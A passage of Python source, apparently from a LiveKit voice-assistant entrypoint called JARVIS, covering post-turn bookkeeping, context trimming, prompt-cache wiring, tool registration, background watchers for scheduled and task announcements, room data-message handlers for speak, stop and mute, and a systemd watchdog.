                                if name:
                                    room_id = getattr(
                                        getattr(ctx, "room", None), "name", "default"
                                    )
                                    _PENDING_PROCEDURE_OFFERS[room_id] = {
                                        "name": name,
                                        "user_text": user_text_for_gate,
                                        "jarvis_text": text or "",
                                        "ts": time.time(),
                                    }
                                    offer = _build_offer_phrase(name)
                                    # _on_item is a sync event handler — can't
                                    # await directly. Fire-and-forget via
                                    # create_task so TTS failure never blocks
                                    # the turn. The task catches its own errors.
                                    async def _say_offer(_offer=offer, _sess=session):
                                        try:
                                            await _sess.say(_offer, allow_interruptions=True)
                                        except Exception as _say_e:
                                            logger.debug("[procedure] offer say failed: %s", _say_e)
                                    asyncio.create_task(_say_offer())
                                    logger.info(
                                        "[procedure] offer appended: name=%s", name
                                    )
                        except Exception as _pe:
                            logger.warning("[procedure] offer step failed: %s", _pe)
                    # Reset usage stash for next turn.
                    session._jarvis_last_input_tokens = None
                    session._jarvis_last_output_tokens = None
                    session._jarvis_last_cache_read_tokens = 0
                    # Reset for next turn so a fresh handoff stamps
                    # the value and absent handoffs leave it None.
                    session._jarvis_last_subagent = None
                    session._jarvis_was_interrupted = False
                    session._jarvis_last_cua_steps = None
                    session._jarvis_last_cua_cost = None
                    # Clear the pre-TTS gate verdict stash so the next
                    # turn starts from a clean slate. user_input_transcribed
                    # also resets these on STT-final, but that fires only
                    # for valid user turns — clearing here protects the
                    # next log_turn from inheriting stale verdicts on
                    # paths that skip the STT-final hook (rare, but the
                    # cleanup is cheap).
                    for _attr in (
                        "_jarvis_confab_check_state",
                        "_jarvis_confab_pattern_matched",
                        "_jarvis_confab_retry_models",
                    ):
                        if hasattr(session, _attr):
                            try:
                                delattr(session, _attr)
                            except Exception:
                                pass
                    # Reset total_audio_ms accumulator (and any open
                    # speaking-segment start) so the next turn starts
                    # clean. Without this, multi-turn sessions would
                    # show monotonically increasing audio ms.
                    session._jarvis_agent_audio_ms_acc = 0
                    session._jarvis_agent_speaking_started_at = None
                    # Reset TTS position table for the next assistant turn so
                    # interrupt-bookkeeping starts clean. See spec
                    # docs/superpowers/specs/2026-05-07-barge-in-truncation-design.md
                    session._jarvis_tts_position_table = []
                    # Reset first-token marker too so the next
                    # turn measures from its own stream start.
                    session._jarvis_first_token_at_monotonic = None
                    # Reset turn-start monotonic so a NEXT rejected
                    # turn (silent-mode / garbage gate) can't inherit
                    # this turn's start and produce a >1M ms TTFW
                    # zombie. Per global review §P0-15.
                    session._jarvis_turn_start_monotonic = None
                except Exception as te:
                    logger.debug(f"[telemetry] write skipped: {te}")
                # Trim the conversation if it has grown too long. The
                # session's own mutable context is `session.history`
                # (livekit-agents 1.5: chat_ctx lives on Agent and is
                # read-only; AgentSession exposes the writable ctx as
                # `.history`). `truncate` drops oldest items in place,
                # preserving the system message + function-call pair
                # boundaries. Pre-2026-06 this read `session.chat_ctx`
                # (AttributeError, silently swallowed) so compaction never
                # ran — the token-aware pre-flight pruner was the only
                # backstop; this restores the intended CTX_MAX_TURNS cap.
                try:
                    hist = getattr(session, "history", None)
                    if hist is not None and len(hist.items) > CTX_MAX_TURNS:
                        before = len(hist.items)
                        hist.truncate(max_items=CTX_MAX_TURNS)
                        logger.info(
                            f"[ctx-compact] truncated {before - len(hist.items)} "
                            f"oldest items ({len(hist.items)} remaining)"
                        )
                except Exception as ce:
                    logger.debug(f"[ctx-compact] could not trim: {ce}")
        except Exception as e:
            logger.warning(f"[turn-write] post-turn bookkeeping failed: {e}")

    # Wire the 5 small state-tracking event handlers (Step 8d). The
    # big `_on_user_input_for_dispatch` Maya-class router that follows
    # this section captures more local state and stays inline for now.
    _register_state_tracking_handlers(session)

    # The Maya-class dispatch handler (@session.on user_input_transcribed)
    # is built + registered AFTER `_jarvis_agent = JarvisAgent(...)` below
    # via `pipeline.turn_dispatcher.make_dispatch_handler` — see Step 8d-3
    # of the 10/10 refactor.
    # Wire session-level event handlers — Step 8c of the 10/10 refactor.
    # See `_register_session_error_handlers` for the TTS / LLM-fallback
    # behavior and `_register_session_crash_watchdog` for the
    # close-event → voice-client-restart path.
    _register_session_error_handlers(session)
    _register_session_crash_watchdog(session, _bg_tasks)

    # Assemble the system-prompt state — Step 8d of the 10/10 refactor.
    # See `_build_initial_prompt_state` for what each piece contains
    # (WHO YOU ARE block + learned rules + pending proposals + memory
    # facts + upstream-provider health).
    _ps = _build_initial_prompt_state(active_speech_id)
    _instructions_prefix = _ps["instructions_prefix"]
    _memory_block        = _ps["memory_block"]
    _last_memory_block   = _memory_block
    _breaker_block       = _ps["breaker_block"]
    _last_breaker_block  = _breaker_block

    _initial_instructions = _ps["initial_instructions"]

    # Stable/volatile cache split (2026-05-23): hand the stable prefix
    # to every LLM wrapper in the dispatcher tree + the active speech
    # LLM so the per-provider cache breakpoint lands BETWEEN stable and
    # volatile instead of at the end of the joined prompt. Wrappers
    # that don't know about caching silently skip (their `set_stable_
    # prefix` doesn't exist). Logged at INFO so operators can confirm
    # the wiring landed during boot.
    try:
        from providers.prompt_cache import apply_stable_prefix_recursively
        _stable_prefix = _ps.get("stable_prefix", "")
        if _stable_prefix:
            _dispatch_llm_for_cache = _stack.get("dispatch_llm")
            _speech_llm_for_cache = _stack.get("speech_llm")
            applied = 0
            if _dispatch_llm_for_cache is not None:
                applied += apply_stable_prefix_recursively(
                    _dispatch_llm_for_cache, _stable_prefix
                )
            if _speech_llm_for_cache is not None:
                applied += apply_stable_prefix_recursively(
                    _speech_llm_for_cache, _stable_prefix
                )
            if applied == 0:
                # Not an error — the dispatcher may be using non-Anthropic
                # / non-Gemini primaries (Groq legacy when ANTHROPIC_API_KEY
                # is unset, OpenAI/DeepSeek as task_override). Those rely
                # on auto-prefix-cache from stable-first ordering, no
                # wrapper hookup needed.
                logger.debug(
                    "[prompt-cache] no cache-aware wrappers found to bind "
                    "stable prefix; relying on auto-prefix-cache (OpenAI/"
                    "DeepSeek/Groq) for cache hits"
                )
    except Exception as e:  # noqa: BLE001 — never block session boot on cache wiring
        logger.warning(
            f"[prompt-cache] stable-prefix wiring skipped: "
            f"{type(e).__name__}: {e}"
        )

    _jarvis_agent = JarvisAgent(
        instructions=_initial_instructions,
        # Tool surface — REGISTRY-ONLY. Every tool the supervisor can
        # call comes from load_all_livekit_tools(), which discovers each
        # self-registering tool module under tools/ (terminal / read_file /
        # write_file / patch / search_files today) and adapts it to a
        # RawFunctionTool. There is NO inline `+ [...]` list anymore:
        # the previously-restored JARVIS tools (memory ×4, skills,
        # plan-mode, tasks, monitors, worktrees, code-search,
        # set_screen_share, ask_user_question) and the inline @function_tool
        # defs (web_search/web_fetch/current_time/date_math/calc/glob_files/
        # grep_files/location trio) were deliberately dropped from the
        # surface — the supervisor is pure-registry while those capabilities
        # are re-ported into the registry framework one wave at a time.
        # (The location/web inline defs still exist at module scope — they
        # back the strict_schema_relax regression tests — but they are
        # intentionally NOT registered here, so the LLM never sees them.)
        # This build also has NO handoff subagents and NO transfer_to_*
        # tools; both return via a later registry port.
        tools=load_all_livekit_tools(),
    )

    # Give llm_node a handle to the per-route DispatchingLLM for the vision gate's
    # best-effort active-model detection (P2a). Defaults to pixels if absent.
    try:
        _jarvis_agent._dispatch_llm = _dispatch_llm
    except Exception:
        pass

    # Pre-TTS confab gate (2026-05-24) — wire the LLM factory + tool_specs
    # the gate's retry chain needs. The factory builds a runner for ANY
    # model id from the SPEECH_MODELS registry; the runner uses livekit-
    # agents' LLMStream.collect() shape, which returns (text, tool_calls).
    # Stashed on the session so the tts filter (which only has access to
    # late-bound session state via _active_session_for_telemetry) can
    # invoke them without holding a reference to entrypoint locals.
    # Spec: docs/superpowers/specs/2026-05-24-pre-tts-confab-gate-design.md
    def _pre_tts_llm_factory(model_id: str):
        """Return an async runner for a given speech-model id.

        The runner takes (chat_ctx, tool_specs) and returns
        (text, tool_calls). Models are built via SPEECH_MODELS — every
        ladder id (claude-haiku-4-5 / claude-sonnet-4-6 / claude-opus-4-7
        / deepseek-v4-flash / gpt-5-mini / gpt-5.1 / gemini-2.5-pro) is
        a registry key; constructing on demand keeps the retry path
        independent of the dispatcher's per-route assembly.
        """
        from providers.llm import SPEECH_MODELS

        async def _runner(retry_ctx, tool_specs):
            entry = SPEECH_MODELS.get(model_id)
            if entry is None:
                raise ValueError(
                    f"_pre_tts_llm_factory: unknown model id {model_id!r} — "
                    "not in SPEECH_MODELS registry"
                )
            inner_llm = entry["build"]()
            # livekit-agents LLMStream.collect() returns a CollectedResponse
            # with .text and .tool_calls (list[FunctionToolCall]). That
            # matches the gate's LLMRunner contract verbatim. collect()
            # uses `async with self:` internally → calls aclose() on
            # exit, so no explicit finally aclose is needed here.
            stream = inner_llm.chat(chat_ctx=retry_ctx, tools=tool_specs)
            collected = await stream.collect()
            return (collected.text or "", list(collected.tool_calls or []))

        return _runner

    session._jarvis_pre_tts_llm_factory = _pre_tts_llm_factory
    # Capture the supervisor's tool specs once at startup — the registry
    # is stable across the session lifetime. Used as the `tool_specs`
    # arg the gate hands to each retry-tier LLM call so the retry has
    # access to the same tool surface as the primary.
    try:
        session._jarvis_pre_tts_tool_specs = list(getattr(_jarvis_agent, "tools", []) or [])
    except Exception:
        session._jarvis_pre_tts_tool_specs = []
    # Per-turn tool-call accumulator (populated by the
    # function_tools_executed handler, consumed by the gate filter).
    session._jarvis_tool_calls_this_turn = []
    # Per-turn gate verdict stash for end-of-turn telemetry. log_turn
    # currently picks up confab_check_state (already wired); the
    # pattern_matched + retry_models fields are stashed here and will
    # be threaded into log_turn by a follow-up commit (turn_telemetry
    # schema already has the columns; log_turn signature does not yet
    # accept them).
    session._jarvis_confab_check_state = None
    session._jarvis_confab_pattern_matched = None
    session._jarvis_confab_retry_models = []
    # Front-loaded ack state — managed by _on_agent_state.
    session._jarvis_front_ack_task = None
    session._jarvis_front_ack_fired = False

    # NOTE: An in-asyncio-loop watchdog here does NOT reach systemd.
    # livekit-agents forks worker subprocesses for each job, and the
    # systemd unit uses NotifyAccess=main which rejects sd_notify()
    # calls from any process other than the main supervisor PID. So
    # the agent-side watchdog lives in __main__ as a daemon thread
    # in the supervisor process (see below). That thread satisfies
    # systemd's Type=notify liveness check but cannot detect a
    # wedged worker loop — if a job's asyncio loop stalls, the
    # supervisor keeps pinging happily and systemd will not restart.
    # That gap is acknowledged in the spec; the voice-CLIENT side
    # has full in-loop wedge detection because it runs the listener
    # in the same process that pings systemd. A future improvement
    # could add a worker-health probe (pipe / socket) the supervisor
    # polls, stopping its pings when a worker stops responding.

    # Build + register the Maya-class dispatch handler — Step 8d-3 of
    # the 10/10 refactor. The closure factory captures every
    # dependency by reference; `_ps` is mutated in place when the
    # handler hot-reloads learned_rules.md or refreshes the memory /
    # breaker blocks.
    from pipeline.turn_dispatcher import make_dispatch_handler
    _dispatch_handler = make_dispatch_handler(
        session=session,
        dispatch_llm=_dispatch_llm,
        dispatch_tts=_dispatch_tts,
        turn_graph=_turn_graph,
        turn_classifier=_turn_classifier,
        bg_tasks=_bg_tasks,
        jarvis_agent=_jarvis_agent,
        prompt_state=_ps,
        build_memory_block=_build_memory_block,
        build_breaker_status_block=_build_breaker_status_block,
    )
    session.on("user_input_transcribed", _dispatch_handler)

    await session.start(
        room=ctx.room,
        agent=_jarvis_agent,
        # Critical: keep the agent session alive when the voice-
        # client disconnects. Default is True — session closes on
        # first client leave — which means when systemd restarts
        # jarvis-voice-client (or the client drops briefly), the
        # agent tears down, the room persists, and LiveKit refuses
        # to re-dispatch a worker to the same room. Result: user
        # reconnects but JARVIS is silent.
        # (Use RoomOptions, not RoomInputOptions — the -Input- /
        # -Output- variants were deprecated in livekit-agents 1.5.)
        #
        # video_input=True is REQUIRED for the screen_share Live
        # subagent — without it, RoomOptions.get_video_input_options()
        # returns None, the AgentSession never subscribes to any video
        # track, and the RealtimeModel's push_video is never called
        # (verified by reading agent_session.py:1428 + room_io/types.py:147).
        # The existing screen_share_sink hooks track_subscribed
        # directly on the Room (separate code path) so this flag doesn't
        # affect the polling-observer path either way. Cost: subscribes
        # to ANY remote video track from the linked participant; the
        # only video we publish is the screen-share, so this is fine.
        room_options=RoomOptions(
            close_on_disconnect=False,
            video_input=True,
        ),
    )

    # ── Between-turn scheduler (phase 1) ──────────────────────────
    # The tick runs in a separate, always-on jarvis-cron.timer process
    # (truly unattended — this LiveKit entrypoint is per-session, so it
    # cannot host the always-on tick). This watcher voices results the
    # timer queues: its first pass drains anything from while you were
    # away, then it polls every PENDING_POLL_S so a job firing mid-session
    # is spoken promptly too. Fire-and-forget, bound to the session
    # (cancelled on disconnect).
    from pipeline import cron_delivery as _crondelivery

    async def _cron_pending_watcher() -> None:
        first = True
        while True:
            # Silent mode (incl. a mute-button click): don't drain or voice
            # scheduled digests — drain_pending is destructive, so checking
            # here keeps them QUEUED until the user unmutes rather than
            # losing them to a dropped, never-spoken digest.
            if _is_silent():
                await asyncio.sleep(_crondelivery.PENDING_POLL_S)
                continue
            prefix = "While you were away: " if first else "Scheduled update — "
            digest = _crondelivery.drain_pending(prefix=prefix)
            if digest:
                try:
                    await session.say(digest)
                except Exception:
                    pass  # session busy/ending — leave the rest queued
            first = False
            await asyncio.sleep(_crondelivery.PENDING_POLL_S)

    asyncio.create_task(_cron_pending_watcher())

    # ── Background-task completion watcher ────────────────────────
    # In-session fire-and-forget delivery: dispatch_agent(background=True)
    # spawns a long subagent and drops a spoken announcement into
    # pipeline.background_tasks when it finishes. This watcher voices each
    # one via session.say() — the same rail as the cron watcher above, but
    # in-process and with background-appropriate wording. If the session
    # isn't ready to speak (idle between turns), the announcement is
    # re-queued and retried on the next tick rather than lost. Bound to the
    # session (cancelled on disconnect). Added 2026-05-30.
    from pipeline import background_tasks as _bgtasks

    async def _background_task_watcher() -> None:
        while True:
            # Silent mode / mute button: hold announcements (don't drain)
            # until unmuted, so a muted JARVIS doesn't blurt a background-
            # task result. They wait in the queue rather than being lost.
            if _is_silent():
                await asyncio.sleep(_bgtasks.poll_s())
                continue
            for ann in _bgtasks.drain_announcements():
                spoken = False
                if getattr(session, "_activity", None) is not None:
                    try:
                        session.say(ann)
                        spoken = True
                    except Exception:
                        spoken = False
                if not spoken:
                    _bgtasks.requeue(ann)  # session not ready — retry next tick
            await asyncio.sleep(_bgtasks.poll_s())

    asyncio.create_task(_background_task_watcher(), name="bg-task-watcher")

    # Spec B (Plane 3) — pattern detector + spawner background loop.
    # Reads turn_telemetry.db every N seconds (default 30 min), emits
    # intents to ~/.jarvis/auto-mods/queue.jsonl on threshold crossings,
    # then optionally spawns the wrapper subprocess if JARVIS_AUTOMOD_SPAWN_LIVE=1.
    # Both no-op when their respective env gates aren't set.
    if os.environ.get("JARVIS_AUTOMOD_ENABLED", "0") == "1":
        try:
            async def _automod_loop():
                from pipeline.automod import experience_signal as _signal
                # Backstop: even with no signal, sweep at most this often so a
                # missed bump can't stall evolution forever. Default 2h.
                backstop = float(os.environ.get("JARVIS_AUTOMOD_BACKSTOP_S", "7200"))
                cooldown = float(os.environ.get("JARVIS_AUTOMOD_COOLDOWN_S", "30"))
                while True:
                    await _signal.wait(backstop)   # wakes on a real signal OR backstop
                    _signal.clear()
                    try:
                        await _automod_tick()
                    except Exception as _e:  # noqa: BLE001
                        logger.warning("[automod] tick failed: %s", _e)
                    # Debounce a burst of signals into one pass.
                    await asyncio.sleep(cooldown)

            asyncio.create_task(_automod_loop(), name="automod-pattern-loop")
            logger.info(
                "[automod] event-driven pattern detector + spawner scheduled "
                "(backstop=%ss; spawn_live=%s; mode-gated build)",
                os.environ.get("JARVIS_AUTOMOD_BACKSTOP_S", "7200"),
                os.environ.get("JARVIS_AUTOMOD_SPAWN_LIVE", "0"),
            )
        except Exception as _e:  # noqa: BLE001
            logger.warning("[automod] scheduler wiring failed: %s", _e)

    # Spawn the background watchers — each is a fire-and-forget task
    # whose lifetime is bound to the job. Extracted 2026-05-10 (Step
    # 8b of the 10/10 refactor). The log-analyzer watcher was retired
    # 2026-05-12 alongside tools/log_analyzer.py — evolution's wireup
    # now owns proposal mining.
    _spawn_screen_share_watcher(session)

    # Fire the session_start hook — let user-installed shell scripts
    # at ~/.jarvis/hooks/session_start/ react to each new voice job.
    # Fire-and-forget; failures log at WARNING. Added 2026-05-12.
    try:
        from pipeline.hooks import fire_hook
        await fire_hook("session_start", {
            "active_speech_id": active_speech_id,
        })
    except Exception as _e:
        logger.warning(f"[hooks] session_start fire failed: {_e}")

    # Handle one-shot "speak this text" requests from any client in
    # the room. session.say() voices the text directly without an
    # LLM round-trip — used by the Tauri UI to voice typed-chat
    # replies that come in over the bridge WS. Payload format:
    #   {"type": "speak", "text": "Rebooting now."}
    # Any other topic / type is ignored silently.
    import json as _json
    import asyncio as _asyncio

    async def _speak_when_ready(text: str) -> None:
        """
        session.say() requires AgentSession._activity to be set —
        which it is mid-turn but may NOT be while the session is
        idle between turns. Poll briefly (up to 3 s) for readiness
        before giving up. If still unavailable, fall back to calling
        the TTS plugin directly via session.tts and publishing to
        the room's audio output manually.
        """
        for _ in range(30):  # 30 × 100 ms = 3 s
            if session._activity is not None:
                try:
                    session.say(text)
                    return
                except RuntimeError as e:
                    if "isn't running" not in str(e):
                        raise
                    # fall through and retry
            await _asyncio.sleep(0.1)
        # Fallback path — the session hasn't produced an activity in
        # 3 s, which shouldn't happen in practice but covers edge
        # cases (agent still booting, reconfiguring). We warn and
        # drop the utterance rather than crashing.
        logger.warning(
            f"session.say unavailable after 3s wait — dropping: {text[:60]}"
        )

    async def _user_input_when_ready(text: str) -> None:
        """
        Inject `text` as a synthetic user turn. Same activity-readiness
        guard as _speak_when_ready — generate_reply also requires an
        active AgentSession activity. Polls up to 3 s for readiness
        before giving up. The agent's existing `conversation_item_added`
        handler picks up both the synthetic user turn AND the assistant
        reply for in-session chat_ctx accounting; conversation does not
        persist off-process.
        """
        for _ in range(30):
            if session._activity is not None:
                try:
                    session.generate_reply(user_input=text)
                    return
                except RuntimeError as e:
                    if "isn't running" not in str(e):
                        raise
            await _asyncio.sleep(0.1)
        logger.warning(
            f"session.generate_reply unavailable after 3s — dropping: {text[:60]}"
        )
        # Tell the panel side what happened — otherwise the chat sits
        # with the user's typed bubble and no reply, looking broken.
        try:
            import json as _json_fb
            payload = _json_fb.dumps({
                "type": "assistant_says",
                "text": "(Couldn't process that — agent wasn't ready. Try again.)",
                "ts_ms": int(time.monotonic() * 1000),
            }).encode("utf-8")
            await ctx.room.local_participant.publish_data(payload, reliable=True)
        except Exception as _e:
            logger.debug(f"[chat-panel] timeout fallback publish failed: {_e!r}")

    @ctx.room.on("data_received")
    def _on_data(packet) -> None:
        try:
            msg = _json.loads(packet.data.decode("utf-8"))
        except Exception:
            return
        if not isinstance(msg, dict):
            return
        t = msg.get("type")
        if t == "speak":
            text = (msg.get("text") or "").strip()
            if text:
                logger.info(f"data-speak: {text[:60]}…")
                _asyncio.create_task(_speak_when_ready(text))
        elif t == "user_input":
            text = (msg.get("text") or "").strip()
            if text:
                logger.info(f"data-user-input: {text[:60]}…")
                _asyncio.create_task(_user_input_when_ready(text))
        elif t == "stop":
            # force=True is load-bearing: in echo-aware mode (the default,
            # JARVIS_ECHO_AWARE_BARGEIN=1) the session sets
            # turn_handling.interruption.enabled=False, and a speech's
            # allow_interruptions falls back to that flag (agent_activity.py
            # allow_interruptions property). So EVERY JARVIS utterance is
            # non-interruptible — a plain session.interrupt() raises
            # "does not allow interruptions", which the except below would
            # swallow, leaving the current utterance playing. That made the
            # mute button / bin/jarvis-mute (both hit /stop) no-op on the
            # in-flight sentence ("Claude still talking while on mute").
            # force bypasses the guard — a deliberate user stop is the
            # highest-trust interrupt intent. Matches the kill-phrase handler.
            # The except RuntimeError now only catches the idle
            # "AgentSession isn't running" case.
            logger.info("data-stop: force-interrupting current utterance")
            try:
                session.interrupt(force=True)
            except RuntimeError:
                pass
        elif t == "silent":
            # OUTPUT mute, published by the voice-client /mute handler so
            # the desktop mute BUTTON also stops JARVIS from talking — not
            # just from hearing. Engages the same silent-mode flag the
            # spoken "Jarvis, mute" command uses: reactive turns drop at
            # on_user_turn_completed, and the proactive say() watchers
            # (cron digest, background-task announcements) hold while it's
            # set. Interrupt any in-flight utterance immediately so a mute
            # mid-sentence cuts him off now, not at the end of the phrase.
            on = bool(msg.get("on", True))
            _set_silent(on)
            logger.info(f"data-silent: silent mode {'ON' if on else 'OFF'}")
            if on:
                # force=True for the same reason as the data-stop handler
                # above: JARVIS speeches are non-interruptible in echo-aware
                # mode (interruption.enabled=False), so a plain interrupt()
                # raises + gets swallowed and the mute button only suppresses
                # FUTURE turns (via _set_silent) — the CURRENT sentence keeps
                # playing. force cuts him off mid-sentence now.
                try:
                    session.interrupt(force=True)
                except RuntimeError:
                    pass

    # Auto-greeting intentionally removed — JARVIS stays silent until
    # the user speaks or a /speak message arrives. Keeps reboots + any
    # reconnect churn from making him chatter at the user unprompted.
    # To re-enable, restore the session.generate_reply() call here.


if __name__ == "__main__":
    # systemd Type=notify watchdog. cli.run_app() below is a
    # blocking sync call that hands the main thread to livekit-
    # agents; we have no asyncio loop here to put a watchdog task
    # into. So we use a daemon thread that pings WATCHDOG=1 every
    # 5s. NotifyAccess=main + WatchdogSec=10s on the unit means
    # systemd kills + restarts the supervisor if we miss two pings.
    #
    # Limitation: this thread runs independently of the worker
    # subprocesses livekit-agents spawns for each job. If a worker's
    # asyncio loop stalls (the original 2026-05-04 incident class),
    # this thread keeps pinging happily and systemd will NOT
    # restart. The voice-CLIENT process has full in-loop wedge
    # detection (see jarvis_voice_client.py main_loop). The agent's
    # main crash class — KeyError on stale track SIDs during
    # reconnect — is fixed structurally by resilience.track_guard
    # (Task 5), so this watchdog is a backstop for general
    # supervisor liveness, not a wedge detector.
    import threading as _threading
    import sdnotify as _sdnotify

    _sd = _sdnotify.SystemdNotifier()
    _sd.notify("READY=1")
    logger.info("[watchdog] main process READY=1 sent to systemd")

    def _main_watchdog_thread() -> None:
        """Ping systemd every 5s from the main supervisor process —
        BUT only when the worker subprocess is fresh. Each worker
        subprocess spawns a daemon thread in `prewarm()` that writes
        /tmp/jarvis-worker-heartbeat every 3s; if it stops (subprocess
        died / Python interpreter wedged) the supervisor stops pinging
        too, so systemd's WatchdogSec=120s restarts the entire process
        tree.

        Grace period of 60s on startup so the worker subprocess has
        time to spawn and prewarm. After grace, a heartbeat older than
        30s is treated as stale → no ping. Pre-2026-05-15 the heartbeat
        producer lived in `entrypoint()` (per job) which meant an idle
        worker — no client connected — never wrote the file and the
        service died in a kill-loop. Moved to prewarm so the worker
        proves liveness from startup, independent of jobs."""
        import os as _os
        import tempfile as _tempfile_hb
        from pathlib import Path as _Path
        # Cross-platform tmp path — must match the producer side above so the
        # watchdog reads the same file the worker writes.
        HB = _Path(_tempfile_hb.gettempdir()) / "jarvis-worker-heartbeat"
        STALE_AFTER_S = 30.0
        GRACE_S = 60.0
        started_at = time.monotonic()
        while True:
            time.sleep(5)
            now = time.monotonic()
            in_grace = (now - started_at) < GRACE_S
            stale = False
            try:
                # Liveness = the freshest heartbeat across the shared latched
                # file (POSIX) AND any per-PID files (Windows, where each of
                # the 4 worker subprocesses writes its own to dodge the
                # cross-process rename sharing-violation). Newest wins — one
                # live worker is enough to prove the tree is alive.
                newest = None
                cands = list(HB.parent.glob(HB.name + ".*"))
                if HB.exists():
                    cands.append(HB)
                for f in cands:
                    try:
                        ts = float(f.read_text().strip())
                    except Exception:
                        continue
                    if newest is None or ts > newest:
                        newest = ts
                if newest is not None:
                    stale = (now - newest) > STALE_AFTER_S
                else:
                    stale = not in_grace  # no heartbeat at all = stale (post-grace)
            except Exception:
                stale = not in_grace
            if stale:
                logger.warning("[watchdog] worker heartbeat stale — withholding WATCHDOG=1")
                continue
            _sd.notify("WATCHDOG=1")

    _threading.Thread(
        target=_main_watchdog_thread,
        name="main-sd-watchdog",
        daemon=True,
    ).start()

    # Per-job memory cap, resolved live so the default rises to 5000 when
    # in-process local STT is on (the 1.6 GB whisper model). See the kwarg below.
    from pipeline.config import job_memory_limit_mb as _job_memory_limit_mb

    cli.run_app(
        WorkerOptions(
            entrypoint_fnc=entrypoint,
            prewarm_fnc=prewarm,
            # 2026-05-05: bumped from default 0.7 → 0.88 after the
            # ~98 KB supervisor prompt + 7 new direct tools (bash,
            # read, edit, write, plan-mode trio) increased per-turn
            # CPU + token-encoding load. At 0.7 the worker was being
            # marked unavailable at load 0.84 mid-conversation,
            # causing LiveKit to drop connections and kill in-flight
            # LLM streams (visible as truncated/empty replies, e.g.
            # turn 1034 "Based on the search" cut off). 0.88 leaves
            # 12 % headroom for backpressure without preempting
            # active conversations. Real CPU saturation still kills
            # the worker; this just stops false-positive unavailability.
            load_threshold=0.88,
            # Keep 4 idle processes warm so a sudden client reconnect
            # doesn't have to cold-start. Default already targets
            # min(cpu_count, 4); we pin the explicit value so it
            # doesn't shrink on lower-cpu hosts.
            num_idle_processes=4,
            # Memory safety net (2026-06-11, retuned 2026-06-21). Recycles a
            # runaway job before its RSS climbs until inference goes
            # slower-than-realtime and the agent wedges (the original 18 h →
            # silent leak). job_memory_warn_mb (500, framework default) only
            # WARNS. Default 1500 for cloud STT; raised to 5000 when
            # faster-whisper runs IN-PROCESS (JARVIS_LOCAL_STT_ENABLED=1) — it
            # loads the ~1.6 GB large-v3-turbo model into each job, and at 1500
            # livekit-agents killed every job mid-transcription (exit -10) and
            # respawned, an OOM loop that left JARVIS silent (live 2026-06-21:
            # 24 kills in ~50 min). Resolved live so it also covers the
            # tray-Local flip. Env JARVIS_JOB_MEMORY_LIMIT_MB wins; 0 disables.
            job_memory_limit_mb=_job_memory_limit_mb(),
            # Bound the SIGTERM drain (framework default: 1800 s). With the
            # desktop voice-client connected a session is ~always "active",
            # so a solo agent stop sat in drain until systemd's stop window
            # (90 s default) SIGKILLed it → 'failed (timeout)' → OnFailure
            # page (live 2026-07-01 16:50). 20 s still finishes an in-flight
            # turn; the unit pairs this with TimeoutStopSec=45.
            drain_timeout=int(os.environ.get("JARVIS_DRAIN_TIMEOUT_S", "20")),
            # livekit-agents binds a health HTTP server on 8081 by
            # default (prod_default in worker.py). Override to 8181
            # to dodge port collisions with other tooling on the same
            # box. JARVIS_WORKER_PORT in the systemd unit's env
            # (or .env loaded by EnvironmentFile=) overrides at runtime.
            port=int(os.environ.get("JARVIS_WORKER_PORT", "8181")),
        ),
    )
